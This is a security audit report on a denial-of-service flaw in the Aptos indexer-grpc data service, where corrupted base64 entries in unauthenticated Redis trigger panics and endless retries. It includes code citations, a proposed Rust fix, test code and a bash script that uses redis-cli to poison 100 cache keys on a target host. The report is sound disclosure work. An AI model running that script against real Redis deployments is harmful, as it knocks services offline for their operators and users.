# Audit Report

## Title
Unauthenticated Redis Access Enables Indexer Data Service DoS via Base64 Decode Panic

## Summary
The indexer-grpc data service panics when processing invalid base64 data from Redis cache, creating a denial-of-service condition through infinite retry loops. If Redis is deployed without authentication and exposed to attackers, malicious actors can inject corrupted cache entries to render the indexer API unavailable for specific transaction versions.

## Finding Description
The vulnerability exists in the cache entry deserialization logic. When `enable_cache_compression` is disabled (the default configuration), the system uses `StorageFormat::Base64UncompressedProto` format for cache entries. [1](#0-0) 

The vulnerable code path uses `.expect()` on base64 decoding, which panics on invalid input: [2](#0-1) 

The attack unfolds as follows:

1. **Infrastructure Exposure**: The default Docker deployment runs Redis without authentication and exposes port 6379. [3](#0-2) 

2. **Predictable Cache Keys**: Cache keys follow a simple format - just the version number for Base64UncompressedProto format. [4](#0-3) 

3. **Attack Execution**: An attacker with network access to Redis can write malformed base64 strings to cache keys using standard Redis commands: `SET "12345" "!!!invalid-base64!!!"`

4. **Panic Propagation**: When a client requests the corrupted version, the data service retrieves it from Redis and attempts deserialization in a blocking task: [5](#0-4) 

5. **Infinite Retry Loop**: The panic is caught and converted to an error, but the error handling logic retries indefinitely without any backoff limit or maximum retry count: [6](#0-5) 

The data fetcher runs in an unbounded loop with no retry limits: [7](#0-6) 

## Impact Explanation
This qualifies as **High Severity** per Aptos bug bounty criteria under "API crashes" category. While the service process doesn't terminate, the indexer API becomes effectively unavailable for affected transaction versions due to:

- **Resource Exhaustion**: Each corrupted version triggers continuous retry loops consuming CPU and memory
- **Amplification**: Multiple clients requesting different corrupted versions multiply the impact
- **Log Flooding**: Error logs fill disk space rapidly
- **Service Degradation**: Legitimate indexer queries cannot be served for poisoned versions

The indexer-grpc data service is critical infrastructure for dApps, wallets, and explorers that rely on historical transaction data. Its unavailability disrupts the entire ecosystem.

## Likelihood Explanation
**Likelihood: Medium** - The attack requires:

1. **Network Access**: Attacker must reach Redis (port 6379)
2. **Misconfiguration**: Redis deployed without authentication (shown in reference deployment)
3. **Knowledge**: Understanding of cache key format (trivially discoverable)

While production deployments should secure Redis, the reference Docker Compose configuration demonstrates the vulnerability exists in recommended deployment patterns. Many operators may follow this template without adding authentication, especially in development/staging environments that could be exposed.

## Recommendation
Implement defense-in-depth measures:

1. **Remove Panic on Invalid Data**: Replace `.expect()` with proper error handling:

```rust
pub fn into_transaction(self) -> Result<Transaction, anyhow::Error> {
    match self {
        CacheEntry::Lz4CompressionProto(bytes) => {
            let mut decompressor = Decoder::new(&bytes[..])?;
            let mut decompressed = Vec::new();
            decompressor.read_to_end(&mut decompressed)?;
            Transaction::decode(decompressed.as_slice())
                .context("proto deserialization failed")
        },
        CacheEntry::Base64UncompressedProto(bytes) => {
            let bytes: Vec<u8> = base64::decode(bytes)
                .context("base64 decoding failed - corrupted cache entry detected")?;
            Transaction::decode(bytes.as_slice())
                .context("proto deserialization failed")
        },
    }
}
```

2. **Add Retry Limits**: Implement exponential backoff with maximum retry count in data fetcher loop

3. **Redis Authentication**: Update Docker Compose to require Redis password by default

4. **Cache Validation**: Add integrity checks (checksums) to detect corrupted entries before deserialization

## Proof of Concept

```rust
// Compile with: cargo test --package aptos-indexer-grpc-utils

#[cfg(test)]
mod dos_poc {
    use super::*;
    use aptos_indexer_grpc_utils::compression_util::{CacheEntry, StorageFormat};
    
    #[test]
    #[should_panic(expected = "base64 decoding failed")]
    fn test_invalid_base64_causes_panic() {
        // Simulate attacker injecting invalid base64 into Redis
        let corrupted_data = b"!!!INVALID-BASE64-DATA!!!".to_vec();
        
        // Create cache entry with corrupted data
        let cache_entry = CacheEntry::new(
            corrupted_data, 
            StorageFormat::Base64UncompressedProto
        );
        
        // This will panic, causing DoS via retry loop
        let _transaction = cache_entry.into_transaction();
    }
    
    #[test]
    fn test_redis_injection_attack_flow() {
        // Step 1: Attacker connects to unauthenticated Redis
        // redis-cli -h <target-ip> -p 6379
        
        // Step 2: Inject malformed base64 for version 12345
        // SET "12345" "!!!corrupted!!!"
        
        // Step 3: Client requests version 12345
        // The service will panic and retry infinitely
        
        // Step 4: Repeat for multiple versions to amplify DoS
        // SET "12346" "!!!corrupted!!!"
        // SET "12347" "!!!corrupted!!!"
    }
}
```

**Attack Script (requires network access to Redis):**
```bash
#!/bin/bash
# Connect to exposed Redis and poison cache entries
for version in {10000..10100}; do
    redis-cli -h <target-ip> SET "$version" "!!!INVALID_BASE64!!!"
done
echo "Injected 100 corrupted cache entries - indexer API now degraded"
```

## Notes
While this vulnerability requires Redis misconfiguration, the reference deployment actively demonstrates this insecure pattern. The use of `.expect()` on external data violates Rust best practices for handling untrusted input. Defense-in-depth dictates that cache data should be validated even when Redis is assumed trusted, as compromise of any infrastructure component should not cascade to service-wide failures.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L156-160)
```rust
        let cache_storage_format: StorageFormat = if self.enable_cache_compression {
            StorageFormat::Lz4CompressedProto
        } else {
            StorageFormat::Base64UncompressedProto
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/compression_util.rs (L132-134)
```rust
            StorageFormat::Base64UncompressedProto => {
                format!("{}", version)
            },
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/compression_util.rs (L152-155)
```rust
            CacheEntry::Base64UncompressedProto(bytes) => {
                let bytes: Vec<u8> = base64::decode(bytes).expect("base64 decoding failed.");
                Transaction::decode(bytes.as_slice()).expect("proto deserialization failed.")
            },
```

**File:** docker/compose/indexer-grpc/docker-compose.yaml (L16-26)
```yaml
  redis:
    image: ${REDIS_IMAGE_REPO:-redis}:7.2
    command: redis-server --appendonly yes
    networks:
      shared:
        ipv4_address:  172.16.1.12
    restart: unless-stopped
    expose:
      - 6379
    ports:
      - 6379:6379
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L364-369)
```rust
        Err(e) => {
            ERROR_COUNT.with_label_values(&["data_fetch_failed"]).inc();
            data_fetch_error_handling(e, start_version, chain_id).await;
            // Retry after a short sleep.
            return DataFetchSubTaskResult::NoResults;
        },
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L468-487)
```rust
    loop {
        // 1. Fetch data from cache and file store.
        let transaction_data = match get_data_with_tasks(
            current_version,
            transactions_count,
            chain_id,
            &mut cache_operator,
            file_store_operator.clone(),
            request_metadata.clone(),
            cache_storage_format,
            in_memory_cache.clone(),
        )
        .await
        {
            DataFetchSubTaskResult::BatchSuccess(txns) => txns,
            DataFetchSubTaskResult::Success(_) => {
                unreachable!("Fetching from multiple tasks will never return a single vector")
            },
            DataFetchSubTaskResult::NoResults => continue,
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L694-709)
```rust
async fn deserialize_cached_transactions(
    transactions: Vec<Vec<u8>>,
    storage_format: StorageFormat,
) -> anyhow::Result<Vec<Transaction>> {
    let task = tokio::task::spawn_blocking(move || {
        transactions
            .into_iter()
            .map(|transaction| {
                let cache_entry = CacheEntry::new(transaction, storage_format);
                cache_entry.into_transaction()
            })
            .collect::<Vec<Transaction>>()
    })
    .await;
    task.context("Transaction bytes to CacheEntry deserialization task failed")
}
```
